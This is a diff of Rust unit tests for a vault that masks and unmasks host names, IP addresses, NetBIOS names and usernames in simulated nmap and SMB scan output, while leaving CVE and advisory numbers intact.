+                "Host <<DOM_01>> exposes SSH, CVSS 7.5, EPSS 0.97531.",
+                "Host intranet-db.corp.example.com exposes SSH, CVSS 7.5, EPSS 0.97531.",
+            ),
+            (
+                "Telnet 23/tcp and SSH are open on <<HOST_01>>'s side.",
+                "Telnet 23/tcp and SSH are open on 10.20.30.40's side.",
             ),
             (
                 "- Open https://<<HOST_01>>/admin first.",
                 "- Open https://10.20.30.40/admin first.",
+            ),
+            (
+                "_<<HOST_01>>_ and **<<DOM_01>>** are affected.",
+                "_10.20.30.40_ and **intranet-db.corp.example.com** are affected.",
             ),
         ] {
             assert_eq!(unmask(reply), shown);
@@ -4866,15 +5048,118 @@ mod tests {
             lib.starts_with("<<DOM_") && !lib.contains("jquery") && !lib.contains("intranet"),
             "{lib}"
         );
-        // A name a scan gives as a machine's is looked for everywhere, but a
-        // number that begins with it is still a number.
+        // Another host's request still masks one where it stands as a host
+        // (audit 4 review): a link, a mail address, a share, a port.
+        vault.register_graph(&graph);
+        vault.scope_to(&graph.hosts["198.51.100.8"]);
+        let text = "302 Found; Location: http://intranet/login; also admin@intranet, \
+                    \\\\intranet\\share, intranet:8443; body: moved to intranet";
+        let masked = vault.mask_text(text);
+        assert!(!masked.contains("//intranet"), "{masked}");
+        assert!(!masked.contains("@intranet"), "{masked}");
+        assert!(!masked.contains("\\\\intranet"), "{masked}");
+        assert!(!masked.contains("intranet:8443"), "{masked}");
+        assert!(masked.ends_with("moved to intranet"), "{masked}");
+        assert!(vault.leaks(&masked).is_empty(), "{masked}");
+        assert!(!vault.leaks("Location: http://intranet/login").is_empty());
+        // A name a scan gives with no host in scope is looked for
+        // everywhere; only an advisory's number that begins with it is left.
         let mut vault = Vault::ephemeral();
-        vault.mask_text("Computer name: FILESRV");
+        vault.mask_text("NetBIOS_Domain_Name: ACME  Computer name: FILESRV  user=jsmith");
         vault.register_graph(&graph);
         assert!(!vault.mask_text("on filesrv now").contains("filesrv"));
+        for text in [
+            "Hosts ACME-01 and ACME-2 answer",
+            "FILESRV-01 holds the backups",
+            "see jsmith-2",
+            "jsmith-2021-1234",
+        ] {
+            let masked = vault.mask_text(text);
+            for name in ["ACME", "FILESRV", "jsmith"] {
+                assert!(!masked.contains(name), "{masked}");
+            }
+            assert!(vault.leaks(&masked).is_empty(), "{masked}");
+        }
         assert_eq!(vault.mask_text("FILESRV-2024-001"), "FILESRV-2024-001");
+        assert_eq!(vault.mask_text("ACME-21-123"), "ACME-21-123");
+        assert_eq!(vault.mask_text("ACME-2021:1234"), "ACME-2021:1234");
         assert_eq!(vault.mask_text("Computer name: CVE"), "Computer name: CVE");
         assert_eq!(vault.mask_text("CVE-2021-23017"), "CVE-2021-23017");
+    }
+
+    /// Audit 4 review: a one-word name a host's scan text gives it (an SMB
+    /// banner's `Computer name: jquery`) is that host's, like a
+    /// certificate's: other hosts' requests keep the word where it is no
+    /// host, also after the session is opened again.
+    #[test]
+    fn a_name_a_banner_gives_stays_with_its_host() {
+        let dir = tempfile::tempdir().unwrap();
+        let db = Arc::new(Mutex::new(Db::open(&dir.path().join("state.db")).unwrap()));
+        let mut graph = Graph::default();
+        for address in ["198.51.100.7", "198.51.100.8"] {
+            graph.apply(Observation::Port {
+                address: address.into(),
+                port: 445,
+                protocol: "tcp".into(),
+                state: "open".into(),
+                service: Some("microsoft-ds".into()),
+                product: None,
+                version: None,
+                extra_info: None,
+                cpes: vec![],
+                record: EvidenceRecord::observed(Source::NmapXml, Confidence::High, "x"),
+            });
+        }
+        graph.apply(Observation::Script {
+            address: "198.51.100.7".into(),
+            port: None,
+            protocol: "tcp".into(),
+            id: "smb-os-discovery".into(),
+            output: "Computer name: jquery  Workgroup: ACME".into(),
+            record: EvidenceRecord::observed(Source::NmapXml, Confidence::High, "x"),
+        });
+        let other = json!({
+            "lib": "jquery 3.4.1 (CVE-2020-11022) on 198.51.100.8",
+            "login": "ACME\\jsmith via //jquery/ and \\\\ACME\\share",
+        });
+        let check = |vault: &mut Vault| {
+            vault.register_graph(&graph);
+            vault.scope_to(&graph.hosts["198.51.100.8"]);
+            let masked = vault.mask_json(&other);
+            let lib = masked["lib"].as_str().unwrap();
+            assert!(
+                lib.starts_with("jquery 3.4.1 (CVE-2020-11022) on <<HOST_"),
+                "{lib}"
+            );
+            let login = masked["login"].as_str().unwrap();
+            assert!(
+                !login.contains("ACME") && !login.contains("//jquery"),
+                "{login}"
+            );
+            assert!(vault.leaks_json(&masked).is_empty(), "{masked}");
+        };
+        {
+            let mut vault = Vault::open(Arc::clone(&db)).unwrap();
+            // Its own request: masked wherever it stands.
+            vault.register_graph(&graph);
+            vault.scope_to(&graph.hosts["198.51.100.7"]);
+            let own = vault.mask_json(&json!({
+                "scripts": "smb-os-discovery: Computer name: jquery  Workgroup: ACME",
+                "lib": "jquery 3.4.1",
+            }));
+            assert!(!own.to_string().contains("jquery"), "{own}");
+            check(&mut vault);
+            // Taught by a request alone (not in the graph): the same.
+            vault.register_graph(&graph);
+            vault.scope_to(&graph.hosts["198.51.100.7"]);
+            vault.mask_text("NetBIOS name: lodash");
+            vault.register_graph(&graph);
+            vault.scope_to(&graph.hosts["198.51.100.8"]);
+            assert_eq!(vault.mask_text("lodash 4.17.20"), "lodash 4.17.20");
+        }
+        // Opened again, the graph says whose name it is.
+        let mut vault = Vault::open(db).unwrap();
+        check(&mut vault);
     }
 
     #[test]
